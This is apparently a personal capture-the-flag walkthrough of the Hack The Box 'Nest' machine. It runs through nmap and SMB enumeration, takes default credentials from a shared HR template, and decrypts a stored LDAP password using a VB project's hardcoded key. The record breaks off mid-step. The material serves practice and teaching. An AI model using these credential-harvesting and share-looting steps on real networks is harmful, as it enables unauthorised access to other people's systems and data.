# Enumeration

# Auto Recon

### NMAP

```console
# Nmap 7.92 scan initiated Fri Apr 29 16:40:29 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/noob2uub/ctf/htb/nest/results/10.10.10.178/scans/_full_tcp_nmap.txt -oX /home/noob2uub/ctf/htb/nest/results/10.10.10.178/scans/xml/_full_tcp_nmap.xml 10.10.10.178
Nmap scan report for 10.10.10.178
Host is up, received user-set (0.070s latency).
Scanned at 2022-04-29 16:40:30 PDT for 660s
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
445/tcp  open  microsoft-ds? syn-ack ttl 127
4386/tcp open  unknown       syn-ack ttl 127
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Hello, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.92%I=9%D=4/29%Time=626C77D0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLin
SF:es,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognise
SF:d\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x2
SF:0V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comma
SF:nd\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
SF:n\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Repo
SF:rting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQK
SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,21,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Hello,3A,"\r\nHQK
SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r
SF:\n>")%r(Help,F2,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nT
SF:his\x20service\x20allows\x20users\x20to\x20run\x20queries\x20against\x2
SF:0databases\x20using\x20the\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVA
SF:ILABLE\x20COMMANDS\x20---\r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\n
SF:RUNQUERY\x20<Query_ID>\r\nDEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>
SF:")%r(SSLSessionReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n
SF:>")%r(TerminalServerCookie,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(TLSSessionReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.
SF:2\r\n\r\n>")%r(SSLv23SessionReq,21,"\r\nHQK\x20Reporting\x20Service\x20
SF:V1\.2\r\n\r\n>")%r(Kerberos,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.
SF:2\r\n\r\n>")%r(SMBProgNeg,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>")%r(X11Probe,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\
SF:r\n>")%r(FourOhFourRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LPDString,21,"\r\nHQK\x20
SF:Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x2
SF:0Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20
SF:Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Re
SF:porting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=4/29%OT=445%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=626C7A02%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=7)
OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M505NW8ST11%O6=M505ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M505NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.008 days (since Fri Apr 29 16:39:36 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental

Host script results:
|_clock-skew: -1m16s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28056/tcp): CLEAN (Timeout)
|   Check 2 (port 23990/tcp): CLEAN (Timeout)
|   Check 3 (port 17014/udp): CLEAN (Timeout)
|   Check 4 (port 2897/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2022-04-29T23:49:35
|_  start_date: 2022-04-29T23:38:34
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   69.39 ms 10.10.14.1
2   69.78 ms 10.10.10.178

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 29 16:51:30 2022 -- 1 IP address (1 host up) scanned in 660.67 seconds
```
SO we find that we have two ports open port 445 and 4386

### SMB Client

```console
do_connect: Connection to 10.10.10.178 failed (Error NT_STATUS_IO_TIMEOUT)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk
	IPC$            IPC       Remote IPC
	Secure$         Disk
	Users           Disk
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available
```
### SMB MAP

```console
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Data                                              	READ ONLY
	.\Data\*
	dr--r--r--                0 Wed Aug  7 15:53:46 2019	.
	dr--r--r--                0 Wed Aug  7 15:53:46 2019	..
	dr--r--r--                0 Wed Aug  7 15:58:07 2019	IT
	dr--r--r--                0 Mon Aug  5 14:53:41 2019	Production
	dr--r--r--                0 Mon Aug  5 14:53:50 2019	Reports
	dr--r--r--                0 Wed Aug  7 12:07:51 2019	Shared
	.\Data\Shared\*
	dr--r--r--                0 Wed Aug  7 12:07:51 2019	.
	dr--r--r--                0 Wed Aug  7 12:07:51 2019	..
	dr--r--r--                0 Wed Jul 21 11:47:12 2021	Maintenance
	dr--r--r--                0 Wed Jul 21 11:47:12 2021	Templates
	.\Data\Shared\Maintenance\*
	dr--r--r--                0 Wed Jul 21 11:47:12 2021	.
	dr--r--r--                0 Wed Jul 21 11:47:12 2021	..
	fr--r--r--               48 Wed Jul 21 11:47:05 2021	Maintenance Alerts.txt
	.\Data\Shared\Templates\*
	dr--r--r--                0 Wed Jul 21 11:47:12 2021	.
	dr--r--r--                0 Wed Jul 21 11:47:12 2021	..
	dr--r--r--                0 Wed Jul 21 11:47:12 2021	HR
	dr--r--r--                0 Wed Aug  7 12:08:07 2019	Marketing
	.\Data\Shared\Templates\HR\*
	dr--r--r--                0 Wed Jul 21 11:47:12 2021	.
	dr--r--r--                0 Wed Jul 21 11:47:12 2021	..
	fr--r--r--              425 Wed Jul 21 11:47:12 2021	Welcome Email.txt
	IPC$                                              	NO ACCESS	Remote IPC
	Secure$                                           	NO ACCESS
	Users                                             	READ ONLY
	.\Users\*
	dr--r--r--                0 Sat Jan 25 15:04:21 2020	.
	dr--r--r--                0 Sat Jan 25 15:04:21 2020	..
	dr--r--r--                0 Wed Jul 21 11:47:04 2021	Administrator
	dr--r--r--                0 Wed Jul 21 11:47:04 2021	C.Smith
	dr--r--r--                0 Thu Aug  8 10:03:29 2019	L.Frost
	dr--r--r--                0 Thu Aug  8 10:02:56 2019	R.Thompson
	dr--r--r--                0 Wed Jul 21 11:47:15 2021	TempUser
```

We have some user names C.Smith, L.Frost,  and R.Thompson

now lets take a look at data by starting with:
.\Data\Shared\Templates\HR\*
.\Data\Shared\Maintenance\*

### SMB Client

```console
noob2uub@kali:~/ctf/htb/nest$ smbclient -N //10.10.10.178/data
Try "help" to get a list of possible commands.
smb: \> cd /Shared/Templates/HR
smb: \Shared\Templates\HR\> ls
  .                                   D        0  Wed Aug  7 12:08:01 2019
  ..                                  D        0  Wed Aug  7 12:08:01 2019
  Welcome Email.txt                   A      425  Wed Aug  7 15:55:36 2019

		5242623 blocks of size 4096. 1840045 blocks available
smb: \Shared\Templates\HR\> get "Welcome Email.txt"
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
smb: \Shared\Templates\HR\> cd ..
smb: \Shared\Templates\> cd ..
smb: \Shared\> cd ..
smb: \> ls
  .                                   D        0  Wed Aug  7 15:53:46 2019
  ..                                  D        0  Wed Aug  7 15:53:46 2019
  IT                                  D        0  Wed Aug  7 15:58:07 2019
  Production                          D        0  Mon Aug  5 14:53:38 2019
  Reports                             D        0  Mon Aug  5 14:53:44 2019
  Shared                              D        0  Wed Aug  7 12:07:51 2019

		5242623 blocks of size 4096. 1840045 blocks available
smb: \> cd /Shared/Maintenance
smb: \Shared\Maintenance\> ls
  .                                   D        0  Wed Aug  7 12:07:32 2019
  ..                                  D        0  Wed Aug  7 12:07:32 2019
  Maintenance Alerts.txt              A       48  Mon Aug  5 16:01:44 2019

		5242623 blocks of size 4096. 1840045 blocks available
smb: \Shared\Maintenance\> get "Maintenance Alerts.txt"
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.2 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

Lets take a look at our files now.

### Welcome Email

```console
noob2uub@kali:~/ctf/htb/nest$ cat 'Welcome Email.txt' 
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
```

We haev TempUser credentials

### Maintenance Alerts

```console
noob2uub@kali:~/ctf/htb/nest$ cat 'Maintenance Alerts.txt' 
There is currently no scheduled maintenance work
```
Nothing here

Now lets see what I can see with TempUser

### SMB Map

```console
noob2uub@kali:~/ctf/htb/nest$ smbmap -H 10.10.10.178 -u TempUser -p welcome2019
[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Data                                              	READ ONLY	
	IPC$                                              	NO ACCESS	Remote IPC
	Secure$                                           	READ ONLY	
	Users                                             	READ ONLY
```

I cant access anything in secure

### SMB Client

```console
noob2uub@kali:~/ctf/htb/nest$ smbclient -U TempUser //10.10.10.178/Secure$ welcome2019
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 16:08:12 2019
  ..                                  D        0  Wed Aug  7 16:08:12 2019
  Finance                             D        0  Wed Aug  7 12:40:13 2019
  HR                                  D        0  Wed Aug  7 16:08:11 2019
  IT                                  D        0  Thu Aug  8 03:59:25 2019

		5242623 blocks of size 4096. 1839915 blocks available
smb: \> cd HR
smb: \HR\> ls
NT_STATUS_ACCESS_DENIED listing \HR\*
smb: \HR\> cd .
smb: \HR\> cd IT
cd \HR\IT\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \HR\> cd ..
smb: \> ls
  .                                   D        0  Wed Aug  7 16:08:12 2019
  ..                                  D        0  Wed Aug  7 16:08:12 2019
  Finance                             D        0  Wed Aug  7 12:40:13 2019
  HR                                  D        0  Wed Aug  7 16:08:11 2019
  IT                                  D        0  Thu Aug  8 03:59:25 2019

		5242623 blocks of size 4096. 1839915 blocks available
smb: \> cd IT
smb: \IT\> ls
NT_STATUS_ACCESS_DENIED listing \IT\*
smb: \IT\> CD ..
smb: \> cd Finance
smb: \Finance\> ls
NT_STATUS_ACCESS_DENIED listing \Finance\*
smb: \Finance\> 
```
now lets take a look at Data and I also googled a simple way to do this :)

### SMB Client with mget

```console
noob2uub@kali:~/ctf/htb/nest$ smbclient -U TempUser //10.10.10.178/Data welcome2019
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 15:53:46 2019
  ..                                  D        0  Wed Aug  7 15:53:46 2019
  IT                                  D        0  Wed Aug  7 15:58:07 2019
  Production                          D        0  Mon Aug  5 14:53:38 2019
  Reports                             D        0  Mon Aug  5 14:53:44 2019
  Shared                              D        0  Wed Aug  7 12:07:51 2019

		5242623 blocks of size 4096. 1840043 blocks available
smb: \> cd Shared
smb: \Shared\> ls
  .                                   D        0  Wed Aug  7 12:07:51 2019
  ..                                  D        0  Wed Aug  7 12:07:51 2019
  Maintenance                         D        0  Wed Aug  7 12:07:32 2019
  Templates                           D        0  Wed Aug  7 12:08:07 2019

		5242623 blocks of size 4096. 1840043 blocks available
smb: \Shared\> cd ..
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \IT\Configs\Adobe\editing.xml of size 246 as IT/Configs/Adobe/editing.xml (0.9 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \IT\Configs\Adobe\Options.txt of size 0 as IT/Configs/Adobe/Options.txt (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)
getting file \IT\Configs\Adobe\projects.xml of size 258 as IT/Configs/Adobe/projects.xml (0.9 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \IT\Configs\Adobe\settings.xml of size 1274 as IT/Configs/Adobe/settings.xml (4.6 KiloBytes/sec) (average 1.4 KiloBytes/sec)
getting file \IT\Configs\Atlas\Temp.XML of size 1369 as IT/Configs/Atlas/Temp.XML (5.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
getting file \IT\Configs\Microsoft\Options.xml of size 4598 as IT/Configs/Microsoft/Options.xml (14.6 KiloBytes/sec) (average 4.1 KiloBytes/sec)
getting file \IT\Configs\NotepadPlusPlus\config.xml of size 6451 as IT/Configs/NotepadPlusPlus/config.xml (23.4 KiloBytes/sec) (average 6.5 KiloBytes/sec)
getting file \IT\Configs\NotepadPlusPlus\shortcuts.xml of size 2108 as IT/Configs/NotepadPlusPlus/shortcuts.xml (7.7 KiloBytes/sec) (average 6.6 KiloBytes/sec)
getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as IT/Configs/RU Scanner/RU_config.xml (1.0 KiloBytes/sec) (average 6.1 KiloBytes/sec)
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Shared/Templates/HR/Welcome Email.txt (1.5 KiloBytes/sec) (average 5.7 KiloBytes/sec)
smb: \> 
```

### Findings

IT Directory
Atlas/temp.xml
Possible new users: 
Deanna Meyes
Jolie Lenehan
Robert O'hara

Configs/notepadplusplus/config.xml
<File filename="C:\windows\System32\drivers\etc\hosts"/><File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt"/><File filename="C:\Users\C.Smith\Desktop\todo.txt"/>
User: Carl

RU Scanner
RU_Config.xml
<ConfigFile><Port>389</Port><Username>c.smith</Username><Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password></ConfigFile>
We have c.smith's password in base64

running cyberchef we find this: }13.??.??=X??J??BA??..X*.Wc.f???????????c.

so its encrypted :(

we know that there is a folder in secure$\Carl and a temp file lets try to get that. 

### SMB Client

```console
noob2uub@kali:~/ctf/htb/nest/IT$ smbclient -U TempUser //10.10.10.178/Secure$ welcome2019
Try "help" to get a list of possible commands.
smb: \> cd IT\Carl
smb: \IT\Carl\> recurse on
smb: \IT\Carl\> prompt off
smb: \IT\Carl\> mget *
getting file \IT\Carl\Docs\ip.txt of size 56 as Docs/ip.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \IT\Carl\Docs\mmc.txt of size 73 as Docs/mmc.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner.sln of size 871 as VB Projects/WIP/RU/RUScanner.sln (3.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\ConfigFile.vb of size 772 as VB Projects/WIP/RU/RUScanner/ConfigFile.vb (2.8 KiloBytes/sec) (average 1.6 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\Module1.vb of size 279 as VB Projects/WIP/RU/RUScanner/Module1.vb (1.0 KiloBytes/sec) (average 1.5 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\RU Scanner.vbproj of size 4828 as VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj (17.5 KiloBytes/sec) (average 4.2 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\RU Scanner.vbproj.user of size 143 as VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user (0.5 KiloBytes/sec) (average 3.6 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\SsoIntegration.vb of size 133 as VB Projects/WIP/RU/RUScanner/SsoIntegration.vb (0.5 KiloBytes/sec) (average 3.2 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\Utils.vb of size 4888 as VB Projects/WIP/RU/RUScanner/Utils.vb (17.8 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Application.Designer.vb of size 441 as VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb (1.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Application.myapp of size 481 as VB Projects/WIP/RU/RUScanner/My Project/Application.myapp (1.7 KiloBytes/sec) (average 4.3 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\AssemblyInfo.vb of size 1163 as VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb (4.2 KiloBytes/sec) (average 4.3 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Resources.Designer.vb of size 2776 as VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb (10.1 KiloBytes/sec) (average 4.7 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Resources.resx of size 5612 as VB Projects/WIP/RU/RUScanner/My Project/Resources.resx (20.4 KiloBytes/sec) (average 5.8 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Settings.Designer.vb of size 2989 as VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb (10.9 KiloBytes/sec) (average 6.2 KiloBytes/sec)
getting file \IT\Carl\VB Projects\WIP\RU\RUScanner\My Project\Settings.settings of size 279 as VB Projects/WIP/RU/RUScanner/My Project/Settings.settings (1.0 KiloBytes/sec) (average 5.8 KiloBytes/sec)
smb: \IT\Carl\> 
```
# CARL protect your stuff :)

### mmc.txt

```console
-- HANDY MMC SNAP INS --

compmgmt.msc
services.msc
dsa.msc
gpmc.msc
```
So we see a few things hes running

### IP.txt

```console
ipconfig /flushdns
ipconfig /release
ipconfig /renew
``` 

nothing here, lets start looking for other stuff. Here is the entire directory owned by Carl.

```console
smb: \IT\Carl\> ls
  .                                   D        0  Wed Aug  7 12:42:14 2019
  ..                                  D        0  Wed Aug  7 12:42:14 2019
  Docs                                D        0  Wed Aug  7 12:44:00 2019
  Reports                             D        0  Tue Aug  6 06:45:40 2019
  VB Projects                         D        0  Tue Aug  6 07:41:55 2019

\IT\Carl\Docs
  .                                   D        0  Wed Aug  7 12:44:00 2019
  ..                                  D        0  Wed Aug  7 12:44:00 2019
  ip.txt                              A       56  Wed Aug  7 12:44:16 2019
  mmc.txt                             A       73  Wed Aug  7 12:43:42 2019

\IT\Carl\Reports
  .                                   D        0  Tue Aug  6 06:45:40 2019
  ..                                  D        0  Tue Aug  6 06:45:40 2019

\IT\Carl\VB Projects
  .                                   D        0  Tue Aug  6 07:41:55 2019
  ..                                  D        0  Tue Aug  6 07:41:55 2019
  Production                          D        0  Tue Aug  6 07:07:13 2019
  WIP                                 D        0  Tue Aug  6 07:47:41 2019

\IT\Carl\VB Projects\Production
  .                                   D        0  Tue Aug  6 07:07:13 2019
  ..                                  D        0  Tue Aug  6 07:07:13 2019

\IT\Carl\VB Projects\WIP
  .                                   D        0  Tue Aug  6 07:47:41 2019
  ..                                  D        0  Tue Aug  6 07:47:41 2019
  RU                                  D        0  Fri Aug  9 08:36:45 2019

\IT\Carl\VB Projects\WIP\RU
  .                                   D        0  Fri Aug  9 08:36:45 2019
  ..                                  D        0  Fri Aug  9 08:36:45 2019
  RUScanner                           D        0  Wed Aug  7 15:05:54 2019
  RUScanner.sln                       A      871  Tue Aug  6 07:45:36 2019

\IT\Carl\VB Projects\WIP\RU\RUScanner
  .                                   D        0  Wed Aug  7 15:05:54 2019
  ..                                  D        0  Wed Aug  7 15:05:54 2019
  bin                                 D        0  Wed Aug  7 13:00:11 2019
  ConfigFile.vb                       A      772  Wed Aug  7 15:05:09 2019
  Module1.vb                          A      279  Wed Aug  7 15:05:44 2019
  My Project                          D        0  Wed Aug  7 13:00:11 2019
  obj                                 D        0  Wed Aug  7 13:00:11 2019
  RU Scanner.vbproj                   A     4828  Fri Aug  9 08:37:51 2019
  RU Scanner.vbproj.user              A      143  Tue Aug  6 05:55:27 2019
  SsoIntegration.vb                   A      133  Wed Aug  7 15:05:58 2019
  Utils.vb                            A     4888  Wed Aug  7 12:49:35 2019

\IT\Carl\VB Projects\WIP\RU\RUScanner\bin
  .                                   D        0  Wed Aug  7 13:00:11 2019
  ..                                  D        0  Wed Aug  7 13:00:11 2019
  Debug                               D        0  Wed Aug  7 12:59:13 2019
  Release                             D        0  Tue Aug  6 05:55:26 2019

\IT\Carl\VB Projects\WIP\RU\RUScanner\My Project
  .                                   D        0  Wed Aug  7 13:00:11 2019
  ..                                  D        0  Wed Aug  7 13:00:11 2019
  Application.Designer.vb             A      441  Tue Aug  6 05:55:13 2019
  Application.myapp                   A      481  Tue Aug  6 05:55:13 2019
  AssemblyInfo.vb                     A     1163  Tue Aug  6 05:55:13 2019
  Resources.Designer.vb               A     2776  Tue Aug  6 05:55:13 2019
  Resources.resx                      A     5612  Tue Aug  6 05:55:13 2019
  Settings.Designer.vb                A     2989  Tue Aug  6 05:55:13 2019
  Settings.settings                   A      279  Tue Aug  6 05:55:13 2019

\IT\Carl\VB Projects\WIP\RU\RUScanner\obj
  .                                   D        0  Wed Aug  7 13:00:11 2019
  ..                                  D        0  Wed Aug  7 13:00:11 2019
  x86                                 D        0  Wed Aug  7 12:59:18 2019

\IT\Carl\VB Projects\WIP\RU\RUScanner\bin\Debug
  .                                   D        0  Wed Aug  7 12:59:13 2019
  ..                                  D        0  Wed Aug  7 12:59:13 2019

\IT\Carl\VB Projects\WIP\RU\RUScanner\bin\Release
  .                                   D        0  Tue Aug  6 05:55:26 2019
  ..                                  D        0  Tue Aug  6 05:55:26 2019

\IT\Carl\VB Projects\WIP\RU\RUScanner\obj\x86
  .                                   D        0  Wed Aug  7 12:59:18 2019
  ..                                  D        0  Wed Aug  7 12:59:18 2019

		5242623 blocks of size 4096. 1840043 blocks available
smb: \IT\Carl\> get temp.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT\Carl\temp.txt
smb: \IT\Carl\> 
```
Runnings strings on the RU Scananner module1.vb brings this.

Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
   
It looks like I am going to have to open this in VS. So lets migrate it over to my home file share to execute on my Windows Machine

![Screenshot_2022-05-02_10-30-40](https://user-images.githubusercontent.com/68706090/166295552-736d659b-20c3-4169-8e67-f93d63e0c199.png)

![VS](https://user-images.githubusercontent.com/68706090/166299065-1b0d8fb7-89e1-4fa8-8a27-6fd40f11cda6.JPG)

I have everything loaded in VS now lets run it. ![debug](https://user-images.githubusercontent.com/68706090/166299095-54cfb008-7d95-4ab8-879c-7fc4aabf3c07.JPG)

This error shows that the XML file needs to be in the bin/debug folder. So lets run the code now. 

After running the code, nothing happend and there was no outputed file to be shown. So I decided to put a break in the running process where I thought the encrpytion was going and just step into each next call. 

It found this part of the code that was running the decryption. 

```console
  Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function
```

![2022-05-02 10_57_01-RUScanner (Debugging) - Microsoft Visual Studio](https://user-images.githubusercontent.com/68706090/166299505-9d1ef644-17d2-43cd-8d71-a8c0ceb64da1.png)

There we go we have the new password 

"xRxRxPANCAK3SxRxRx"

No now lets go back into SMB Client and see what she has.

### SMB Client

```console
noob2uub@kali:~/ctf/htb/nest$ smbclient -U c.smith //10.10.10.178/Users xRxRxPANCAK3SxRxRx
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 15:04:21 2020
  ..                                  D        0  Sat Jan 25 15:04:21 2020
  Administrator                       D        0  Fri Aug  9 08:08:23 2019
  C.Smith                             D        0  Sat Jan 25 23:21:44 2020
  L.Frost                             D        0  Thu Aug  8 10:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 10:02:50 2019
  TempUser                            D        0  Wed Aug  7 15:55:56 2019

		5242623 blocks of size 4096. 1839915 blocks available
smb: \> cd C.Smith\
smb: \C.Smith\> ls
  .                                   D        0  Sat Jan 25 23:21:44 2020
  ..                                  D        0  Sat Jan 25 23:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 16:06:17 2019
  user.txt                            A       34  Mon May  2 08:33:32 2022

		5242623 blocks of size 4096. 1839915 blocks available
smb: \C.Smith\> recurse on
smb: \C.Smith\> prompt off
smb: \C.Smith\> mget *
getting file \C.Smith\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt of size 0 as HQK Reporting/Debug Mode Password.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\HQK_Config_Backup.xml of size 249 as HQK Reporting/HQK_Config_Backup.xml (0.9 KiloBytes/sec) (average 0.4 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HQK Reporting/AD Integration Module/HqkLdap.exe (51.2 KiloBytes/sec) (average 16.3 KiloBytes/sec)
smb: \C.Smith\> 
```

and we see that we have out first flag also with user.txt, lets go through our loot. 

We now find port 4386

```console
noob2uub@kali:~/ctf/htb/nest/HQK Reporting$ cat HQK_Config_Backup.xml 
<?xml version="1.0"?>
